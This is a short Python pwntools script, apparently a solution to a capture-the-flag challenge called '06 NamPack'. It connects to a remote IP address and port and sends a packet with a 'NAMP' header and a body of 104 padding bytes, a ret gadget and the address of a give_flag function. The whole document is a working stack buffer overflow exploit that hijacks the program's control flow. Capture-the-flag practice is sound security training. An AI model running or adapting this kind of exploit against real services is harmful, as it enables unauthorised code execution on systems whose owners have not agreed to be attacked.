#!/usr/bin/env python3
"""06 NamPack: remote blind solve (pwntools + network only)."""
from pwn import *

HOST = '167.86.100.57'
PORT = 9006
GIVE_FLAG = 0x4012bb
RET = 0x40101a  # stack alignment before give_flag (needed on remote)
OFS = 104

context.arch = 'amd64'
context.log_level = 'error'
io = remote(HOST, PORT)
io.recvuntil(b'packet')

body = b'A' * OFS + p64(RET) + p64(GIVE_FLAG)
hdr = b'NAMP' + p16(99) + p16(len(body))
io.send(hdr + body)
print(io.recvall(timeout=3).decode(errors='ignore'), end='')
